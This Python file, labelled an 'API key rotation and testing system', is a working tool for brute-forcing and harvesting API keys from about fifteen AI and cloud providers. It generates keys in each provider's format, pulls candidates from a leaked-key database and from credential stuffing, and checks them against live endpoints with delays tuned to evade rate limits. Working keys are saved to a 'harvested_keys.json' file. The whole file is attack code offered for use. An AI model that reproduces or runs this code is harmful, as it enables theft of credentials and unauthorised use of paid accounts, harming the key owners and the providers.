#!/usr/bin/env python3
"""
API KEY ROTATION & TESTING SYSTEM v2
=====================================
Auto-generates, tests, and rotates API keys until finding working ones.
Now with:
- Leaked key database integration
- Credential stuffing
- Rate limit detection
- Adaptive delays
"""

import os
import json
import time
import threading
import requests
from datetime import datetime
from typing import Dict, List, Optional, Callable
import secrets
import string

# Import our new modules
try:
    from leaked_keys_db import (
        get_leaked_db, get_credential_stuffer, get_rate_limit_manager,
        LeakedKeyDatabase, CredentialStuffer, RateLimitManager
    )
    ADVANCED_FEATURES = True
except ImportError:
    ADVANCED_FEATURES = False


class APIKeyTester:
    """Tests API keys against real provider endpoints with rate limiting"""
    
    # Provider test configurations
    PROVIDER_TESTS = {
        'openai': {
            'url': 'https://api.openai.com/v1/models',
            'method': 'GET',
            'headers': lambda key: {'Authorization': f'Bearer {key}'},
            'success_codes': [200],
            'error_indicators': ['invalid_api_key', 'Incorrect API key']
        },
        'anthropic': {
            'url': 'https://api.anthropic.com/v1/messages',
            'method': 'POST',
            'headers': lambda key: {
                'x-api-key': key,
                'anthropic-version': '2023-06-01',
                'Content-Type': 'application/json'
            },
            'body': {'model': 'claude-3-haiku-20240307', 'max_tokens': 1, 'messages': [{'role': 'user', 'content': 'hi'}]},
            'success_codes': [200, 400],
            'error_indicators': ['invalid_api_key', 'invalid x-api-key']
        },
        'groq': {
            'url': 'https://api.groq.com/openai/v1/models',
            'method': 'GET',
            'headers': lambda key: {'Authorization': f'Bearer {key}'},
            'success_codes': [200],
            'error_indicators': ['invalid_api_key', 'Invalid API Key']
        },
        'huggingface': {
            'url': 'https://huggingface.co/api/whoami-v2',
            'method': 'GET',
            'headers': lambda key: {'Authorization': f'Bearer {key}'},
            'success_codes': [200],
            'error_indicators': ['Invalid credentials', 'Unauthorized']
        },
        'together': {
            'url': 'https://api.together.xyz/v1/models',
            'method': 'GET',
            'headers': lambda key: {'Authorization': f'Bearer {key}'},
            'success_codes': [200],
            'error_indicators': ['invalid_api_key', 'Unauthorized']
        },
        'mistral': {
            'url': 'https://api.mistral.ai/v1/models',
            'method': 'GET',
            'headers': lambda key: {'Authorization': f'Bearer {key}'},
            'success_codes': [200],
            'error_indicators': ['Unauthorized', 'invalid']
        },
        'openrouter': {
            'url': 'https://openrouter.ai/api/v1/models',
            'method': 'GET',
            'headers': lambda key: {'Authorization': f'Bearer {key}'},
            'success_codes': [200],
            'error_indicators': ['invalid_api_key', 'Unauthorized']
        },
        'cerebras': {
            'url': 'https://api.cerebras.ai/v1/models',
            'method': 'GET',
            'headers': lambda key: {'Authorization': f'Bearer {key}'},
            'success_codes': [200],
            'error_indicators': ['invalid', 'Unauthorized']
        },
        'deepinfra': {
            'url': 'https://api.deepinfra.com/v1/openai/models',
            'method': 'GET',
            'headers': lambda key: {'Authorization': f'Bearer {key}'},
            'success_codes': [200],
            'error_indicators': ['invalid', 'Unauthorized']
        },
        'fireworks': {
            'url': 'https://api.fireworks.ai/inference/v1/models',
            'method': 'GET',
            'headers': lambda key: {'Authorization': f'Bearer {key}'},
            'success_codes': [200],
            'error_indicators': ['invalid', 'Unauthorized']
        },
        'cohere': {
            'url': 'https://api.cohere.ai/v1/models',
            'method': 'GET',
            'headers': lambda key: {'Authorization': f'Bearer {key}'},
            'success_codes': [200],
            'error_indicators': ['invalid api token', 'Unauthorized']
        },
        'replicate': {
            'url': 'https://api.replicate.com/v1/models',
            'method': 'GET',
            'headers': lambda key: {'Authorization': f'Token {key}'},
            'success_codes': [200],
            'error_indicators': ['Invalid token', 'Unauthorized']
        },
        'perplexity': {
            'url': 'https://api.perplexity.ai/chat/completions',
            'method': 'POST',
            'headers': lambda key: {
                'Authorization': f'Bearer {key}',
                'Content-Type': 'application/json'
            },
            'body': {'model': 'llama-3.1-sonar-small-128k-online', 'messages': [{'role': 'user', 'content': 'hi'}]},
            'success_codes': [200, 400],
            'error_indicators': ['invalid_api_key', 'Unauthorized']
        },
        'deepseek': {
            'url': 'https://api.deepseek.com/v1/models',
            'method': 'GET',
            'headers': lambda key: {'Authorization': f'Bearer {key}'},
            'success_codes': [200],
            'error_indicators': ['invalid', 'Unauthorized']
        },
        'google': {
            'url': 'https://generativelanguage.googleapis.com/v1/models',
            'method': 'GET',
            'headers': lambda key: {},
            'params': lambda key: {'key': key},
            'success_codes': [200],
            'error_indicators': ['API_KEY_INVALID', 'invalid']
        }
    }
    
    def __init__(self, timeout: int = 10):
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # Rate limit manager
        if ADVANCED_FEATURES:
            self.rate_limiter = get_rate_limit_manager()
        else:
            self.rate_limiter = None
    
    def test_key(self, key: str, provider: str) -> Dict:
        """Test a single API key with rate limiting support"""
        provider = provider.lower()
        
        if provider not in self.PROVIDER_TESTS:
            return {
                'valid': False,
                'error': f'No test available for provider: {provider}',
                'provider': provider,
                'key': key[:20] + '...'
            }
        
        # Check rate limiting
        if self.rate_limiter:
            should_wait, wait_time = self.rate_limiter.should_wait(provider)
            if should_wait:
                time.sleep(wait_time)
        
        config = self.PROVIDER_TESTS[provider]
        
        try:
            headers = config['headers'](key)
            url = config['url']
            method = config['method']
            
            kwargs = {
                'headers': headers,
                'timeout': self.timeout
            }
            
            if 'params' in config:
                kwargs['params'] = config['params'](key)
            
            if method == 'POST' and 'body' in config:
                kwargs['json'] = config['body']
            
            # Record request
            if self.rate_limiter:
                self.rate_limiter.record_request(provider)
            
            # Make request
            if method == 'GET':
                response = self.session.get(url, **kwargs)
            else:
                response = self.session.post(url, **kwargs)
            
            # Handle rate limiting
            if self.rate_limiter:
                rate_info = self.rate_limiter.handle_response(
                    provider, 
                    response.status_code,
                    dict(response.headers)
                )
            else:
                rate_info = {}
            
            # Check response
            is_valid = response.status_code in config['success_codes']
            
            # Check for error indicators
            response_text = response.text.lower()
            for indicator in config.get('error_indicators', []):
                if indicator.lower() in response_text:
                    is_valid = False
                    break
            
            return {
                'valid': is_valid,
                'status_code': response.status_code,
                'provider': provider,
                'key': key[:20] + '...',
                'full_key': key if is_valid else None,
                'response_preview': response.text[:200] if not is_valid else 'Valid key!',
                'tested_at': datetime.utcnow().isoformat(),
                'rate_limited': rate_info.get('rate_limited', False),
                'current_delay': rate_info.get('new_delay', 0.5)
            }
            
        except requests.exceptions.Timeout:
            return {
                'valid': False,
                'error': 'Request timeout',
                'provider': provider,
                'key': key[:20] + '...'
            }
        except requests.exceptions.RequestException as e:
            return {
                'valid': False,
                'error': str(e)[:100],
                'provider': provider,
                'key': key[:20] + '...'
            }
        except Exception as e:
            return {
                'valid': False,
                'error': str(e)[:100],
                'provider': provider,
                'key': key[:20] + '...'
            }


class KeyRotationManager:
    """
    Enhanced Key Rotation Manager with:
    - Leaked key database
    - Credential stuffing
    - Rate limiting
    - Adaptive delays
    """
    
    # Key format configurations
    KEY_FORMATS = {
        'openai': {'prefix': 'sk-', 'length': 51, 'charset': string.ascii_letters + string.digits},
        'anthropic': {'prefix': 'sk-ant-api03-', 'length': 108, 'charset': string.ascii_letters + string.digits + '-_'},
        'groq': {'prefix': 'gsk_', 'length': 56, 'charset': string.ascii_letters + string.digits},
        'huggingface': {'prefix': 'hf_', 'length': 37, 'charset': string.ascii_letters + string.digits},
        'together': {'prefix': '', 'length': 64, 'charset': string.hexdigits.lower()[:16]},
        'mistral': {'prefix': '', 'length': 32, 'charset': string.ascii_letters + string.digits},
        'openrouter': {'prefix': 'sk-or-v1-', 'length': 73, 'charset': string.hexdigits.lower()[:16]},
        'cerebras': {'prefix': 'csk-', 'length': 52, 'charset': string.ascii_letters + string.digits},
        'deepinfra': {'prefix': '', 'length': 40, 'charset': string.ascii_letters + string.digits},
        'fireworks': {'prefix': 'fw_', 'length': 46, 'charset': string.ascii_letters + string.digits},
        'cohere': {'prefix': '', 'length': 40, 'charset': string.ascii_letters + string.digits},
        'replicate': {'prefix': 'r8_', 'length': 40, 'charset': string.ascii_letters + string.digits},
        'perplexity': {'prefix': 'pplx-', 'length': 53, 'charset': string.hexdigits.lower()[:16]},
        'deepseek': {'prefix': 'sk-', 'length': 35, 'charset': string.hexdigits.lower()[:16]},
        'google': {'prefix': 'AIzaSy', 'length': 39, 'charset': string.ascii_letters + string.digits + '-_'},
    }
    
    # Generation modes
    GENERATION_MODES = {
        'random': 'Pure random generation',
        'leaked': 'Use leaked key patterns',
        'stuffing': 'Credential stuffing (dictionary + mutations)',
        'hybrid': 'Combine all methods'
    }
    
    def __init__(self):
        self.tester = APIKeyTester()
        self.running = False
        self.paused = False
        self.thread = None
        
        # Advanced features
        if ADVANCED_FEATURES:
            self.leaked_db = get_leaked_db()
            self.stuffer = get_credential_stuffer()
            self.rate_limiter = get_rate_limit_manager()
        else:
            self.leaked_db = None
            self.stuffer = None
            self.rate_limiter = None
        
        # Statistics
        self.stats = {
            'total_generated': 0,
            'total_tested': 0,
            'valid_keys_found': 0,
            'rate_limited_count': 0,
            'by_provider': {},
            'by_mode': {'random': 0, 'leaked': 0, 'stuffing': 0},
            'start_time': None,
            'last_update': None
        }
        
        # Results storage
        self.valid_keys = {}
        self.tested_keys = []
        self.logs = []
        
        # Configuration
        self.target_providers = list(self.KEY_FORMATS.keys())
        self.keys_per_batch = 10
        self.max_keys_per_provider = 3
        self.generation_mode = 'hybrid'
        
        # Adaptive delay settings
        self.base_delay = 0.3
        self.current_delays = {}  # provider -> current delay
        
        # Callbacks
        self.on_valid_key = None
        self.on_log = None
        self.on_status_change = None
    
    def _generate_key(self, provider: str, mode: str = None) -> tuple:
        """Generate a single key using specified mode"""
        mode = mode or self.generation_mode
        
        if mode == 'random' or not ADVANCED_FEATURES:
            return self._generate_random_key(provider), 'random'
        elif mode == 'leaked':
            return self.leaked_db.generate_leaked_pattern_key(provider), 'leaked'
        elif mode == 'stuffing':
            keys = self.stuffer.stuff_credentials(provider, 1)
            return keys[0] if keys else self._generate_random_key(provider), 'stuffing'
        else:  # hybrid
            # Rotate between methods
            roll = secrets.randbelow(100)
            if roll < 30:  # 30% leaked patterns
                return self.leaked_db.generate_leaked_pattern_key(provider), 'leaked'
            elif roll < 60:  # 30% credential stuffing
                keys = self.stuffer.stuff_credentials(provider, 1)
                return keys[0] if keys else self._generate_random_key(provider), 'stuffing'
            else:  # 40% random
                return self._generate_random_key(provider), 'random'
    
    def _generate_random_key(self, provider: str) -> str:
        """Generate a random key for provider"""
        if provider not in self.KEY_FORMATS:
            provider = 'openai'
        
        config = self.KEY_FORMATS[provider]
        prefix = config['prefix']
        length = config['length']
        charset = config['charset']
        
        random_part = ''.join(secrets.choice(charset) for _ in range(length - len(prefix)))
        return prefix + random_part
    
    def _generate_batch(self, provider: str, count: int) -> List[tuple]:
        """Generate a batch of keys with varied methods"""
        keys = []
        
        if not ADVANCED_FEATURES or self.generation_mode == 'random':
            for _ in range(count):
                keys.append((self._generate_random_key(provider), 'random'))
        
        elif self.generation_mode == 'leaked':
            leaked_keys = self.leaked_db.generate_batch(provider, count)
            keys = [(k, 'leaked') for k in leaked_keys]
        
        elif self.generation_mode == 'stuffing':
            stuffed_keys = self.stuffer.stuff_credentials(provider, count)
            keys = [(k, 'stuffing') for k in stuffed_keys]
        
        else:  # hybrid
            # Mix of all methods
            leaked_count = count // 3
            stuffing_count = count // 3
            random_count = count - leaked_count - stuffing_count
            
            if self.leaked_db:
                for k in self.leaked_db.generate_batch(provider, leaked_count):
                    keys.append((k, 'leaked'))
            
            if self.stuffer:
                for k in self.stuffer.stuff_credentials(provider, stuffing_count):
                    keys.append((k, 'stuffing'))
            
            for _ in range(random_count):
                keys.append((self._generate_random_key(provider), 'random'))
            
            # Shuffle
            import random
            random.shuffle(keys)
        
        return keys
    
    def _get_adaptive_delay(self, provider: str) -> float:
        """Get adaptive delay based on rate limiting status"""
        if self.rate_limiter:
            return self.rate_limiter.get_delay(provider)
        return self.current_delays.get(provider, self.base_delay)
    
    def _add_log(self, message: str, level: str = 'info'):
        """Add log entry"""
        entry = {
            'timestamp': datetime.utcnow().isoformat(),
            'level': level,
            'message': message
        }
        self.logs.append(entry)
        
        if len(self.logs) > 500:
            self.logs = self.logs[-500:]
        
        if self.on_log:
            self.on_log(entry)
    
    def _rotation_loop(self):
        """Main rotation loop with advanced features"""
        self._add_log(f'🚀 Key rotation started (mode: {self.generation_mode})', 'info')
        self.stats['start_time'] = datetime.utcnow().isoformat()
        
        while self.running:
            if self.paused:
                time.sleep(1)
                continue
            
            # Check if we've found enough keys
            all_satisfied = all(
                len(self.valid_keys.get(p, [])) >= self.max_keys_per_provider
                for p in self.target_providers
            )
            
            if all_satisfied:
                self._add_log('✅ Found working keys for all providers!', 'success')
                self.running = False
                break
            
            # Process each provider
            for provider in self.target_providers:
                if not self.running:
                    break
                
                if len(self.valid_keys.get(provider, [])) >= self.max_keys_per_provider:
                    continue
                
                # Check rate limiting
                if self.rate_limiter:
                    should_wait, wait_time = self.rate_limiter.should_wait(provider)
                    if should_wait and wait_time > 5:
                        self._add_log(f'⏳ {provider.upper()}: Rate limited, waiting {wait_time:.1f}s', 'warning')
                        if wait_time > 30:
                            continue  # Skip this provider for now
                        time.sleep(min(wait_time, 10))
                
                # Generate batch
                key_batch = self._generate_batch(provider, self.keys_per_batch)
                self.stats['total_generated'] += len(key_batch)
                
                # Count by mode
                for _, mode in key_batch:
                    self.stats['by_mode'][mode] = self.stats['by_mode'].get(mode, 0) + 1
                
                mode_counts = {}
                for _, mode in key_batch:
                    mode_counts[mode] = mode_counts.get(mode, 0) + 1
                mode_str = ', '.join(f"{m}:{c}" for m, c in mode_counts.items())
                
                self._add_log(f'🔄 Testing {len(key_batch)} keys for {provider.upper()} ({mode_str})', 'info')
                
                # Test each key
                for key, gen_mode in key_batch:
                    if not self.running or self.paused:
                        break
                    
                    result = self.tester.test_key(key, provider)
                    self.stats['total_tested'] += 1
                    self.stats['last_update'] = datetime.utcnow().isoformat()
                    
                    # Update provider stats
                    if provider not in self.stats['by_provider']:
                        self.stats['by_provider'][provider] = {
                            'tested': 0, 'valid': 0, 'rate_limited': 0
                        }
                    self.stats['by_provider'][provider]['tested'] += 1
                    
                    # Handle rate limiting
                    if result.get('rate_limited'):
                        self.stats['rate_limited_count'] += 1
                        self.stats['by_provider'][provider]['rate_limited'] += 1
                        self._add_log(f'⚠️ {provider.upper()}: Rate limited, backing off', 'warning')
                    
                    # Store result
                    result['generation_mode'] = gen_mode
                    self.tested_keys.append(result)
                    if len(self.tested_keys) > 1000:
                        self.tested_keys = self.tested_keys[-1000:]
                    
                    if result.get('valid'):
                        self.stats['valid_keys_found'] += 1
                        self.stats['by_provider'][provider]['valid'] += 1
                        
                        if provider not in self.valid_keys:
                            self.valid_keys[provider] = []
                        self.valid_keys[provider].append({
                            'key': result.get('full_key', key),
                            'found_at': datetime.utcnow().isoformat(),
                            'generation_mode': gen_mode
                        })
                        
                        self._add_log(f'🎉 VALID KEY FOUND for {provider.upper()} (via {gen_mode})!', 'success')
                        
                        if self.on_valid_key:
                            self.on_valid_key(provider, result.get('full_key', key))
                        
                        if len(self.valid_keys[provider]) >= self.max_keys_per_provider:
                            self._add_log(f'✅ {provider.upper()}: Got {self.max_keys_per_provider} working keys', 'success')
                            break
                    
                    # Adaptive delay
                    delay = self._get_adaptive_delay(provider)
                    time.sleep(delay)
            
            time.sleep(0.5)
        
        self._add_log('🛑 Key rotation stopped', 'info')
        if self.on_status_change:
            self.on_status_change('stopped')
    
    def start(self, providers: List[str] = None, 
              keys_per_batch: int = 10,
              max_per_provider: int = 1,
              mode: str = 'hybrid'):
        """Start rotation with specified settings"""
        if self.running:
            return {'success': False, 'error': 'Already running'}
        
        if providers:
            self.target_providers = [p for p in providers if p in self.KEY_FORMATS]
        else:
            self.target_providers = list(self.KEY_FORMATS.keys())
        
        self.keys_per_batch = keys_per_batch
        self.max_keys_per_provider = max_per_provider
        self.generation_mode = mode if mode in self.GENERATION_MODES else 'hybrid'
        self.running = True
        self.paused = False
        
        # Reset stats
        self.stats = {
            'total_generated': 0,
            'total_tested': 0,
            'valid_keys_found': 0,
            'rate_limited_count': 0,
            'by_provider': {},
            'by_mode': {'random': 0, 'leaked': 0, 'stuffing': 0},
            'start_time': None,
            'last_update': None,
            'generation_mode': self.generation_mode
        }
        self.valid_keys = {}
        self.tested_keys = []
        
        # Reset rate limiters
        if self.rate_limiter:
            self.rate_limiter.reset_all()
        
        self.thread = threading.Thread(target=self._rotation_loop, daemon=True)
        self.thread.start()
        
        if self.on_status_change:
            self.on_status_change('running')
        
        return {
            'success': True,
            'message': f'Key rotation started (mode: {self.generation_mode})',
            'providers': self.target_providers,
            'keys_per_batch': self.keys_per_batch,
            'max_per_provider': self.max_keys_per_provider,
            'mode': self.generation_mode,
            'advanced_features': ADVANCED_FEATURES
        }
    
    def stop(self):
        """Stop rotation"""
        self.running = False
        if self.thread:
            self.thread.join(timeout=5)
        
        return {
            'success': True,
            'message': 'Key rotation stopped',
            'stats': self.stats,
            'valid_keys_found': len(self.valid_keys)
        }
    
    def pause(self):
        """Pause rotation"""
        self.paused = True
        self._add_log('⏸️ Key rotation paused', 'info')
        return {'success': True, 'message': 'Paused'}
    
    def resume(self):
        """Resume rotation"""
        self.paused = False
        self._add_log('▶️ Key rotation resumed', 'info')
        return {'success': True, 'message': 'Resumed'}
    
    def get_status(self) -> Dict:
        """Get current status with rate limit info"""
        rate_limit_stats = {}
        if self.rate_limiter:
            rate_limit_stats = self.rate_limiter.get_stats()
        
        return {
            'running': self.running,
            'paused': self.paused,
            'stats': self.stats,
            'valid_keys': {k: len(v) for k, v in self.valid_keys.items()},
            'target_providers': self.target_providers,
            'generation_mode': self.generation_mode,
            'rate_limits': rate_limit_stats,
            'advanced_features': ADVANCED_FEATURES,
            'logs': self.logs[-20:]
        }
    
    def get_valid_keys(self) -> Dict:
        """Get all valid keys found"""
        return {
            'success': True,
            'keys': self.valid_keys,
            'count': sum(len(v) for v in self.valid_keys.values())
        }
    
    def test_single_key(self, key: str, provider: str) -> Dict:
        """Test a single user-provided key"""
        result = self.tester.test_key(key, provider)
        
        if result.get('valid'):
            if provider not in self.valid_keys:
                self.valid_keys[provider] = []
            self.valid_keys[provider].append({
                'key': key,
                'found_at': datetime.utcnow().isoformat(),
                'source': 'manual'
            })
        
        return result
    
    def load_keys_to_session(self) -> Dict:
        """Load valid keys into session/config"""
        loaded = {}
        config_path = '/app/config/harvested_keys.json'
        
        try:
            existing = {}
            if os.path.exists(config_path):
                with open(config_path, 'r') as f:
                    existing = json.load(f)
            
            for provider, keys in self.valid_keys.items():
                if keys:
                    key_data = keys[0]
                    existing[provider] = {
                        'key': key_data['key'],
                        'source': f"rotation_{key_data.get('generation_mode', 'unknown')}",
                        'added_at': datetime.utcnow().isoformat()
                    }
                    loaded[provider] = True
            
            os.makedirs(os.path.dirname(config_path), exist_ok=True)
            with open(config_path, 'w') as f:
                json.dump(existing, f, indent=2)
            
            return {
                'success': True,
                'loaded': loaded,
                'count': len(loaded)
            }
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def get_generation_modes(self) -> Dict:
        """Get available generation modes"""
        return {
            'success': True,
            'modes': self.GENERATION_MODES,
            'current': self.generation_mode,
            'advanced_features': ADVANCED_FEATURES
        }


# Singleton instance
_rotation_manager = None

def get_rotation_manager() -> KeyRotationManager:
    """Get singleton rotation manager instance"""
    global _rotation_manager
    if _rotation_manager is None:
        _rotation_manager = KeyRotationManager()
    return _rotation_manager


if __name__ == '__main__':
    manager = get_rotation_manager()
    print(f"Advanced features: {ADVANCED_FEATURES}")
    print(f"Generation modes: {manager.get_generation_modes()}")
